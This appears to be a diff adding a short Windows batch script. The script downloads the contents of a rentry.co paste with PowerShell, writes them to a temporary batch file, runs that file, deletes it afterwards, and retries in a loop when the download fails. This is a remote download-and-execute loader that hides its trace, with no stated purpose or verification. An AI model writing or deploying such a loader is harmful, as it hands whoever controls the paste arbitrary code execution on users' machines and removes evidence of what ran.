@@ -1,0 +1,18 @@
+@echo off
+color 0A
+setlocal enabledelayedexpansion
+set "embeddedScript=temp_script_RUNEVERY.bat"
+
+:RUNEVERYCALLER
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/RUNEVERY/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Filed to get content from RUNEVERY Link
+    echo.
+    timeout /t 2 /nobreak >nul
+    goto RUNEVERYCALLER
+)
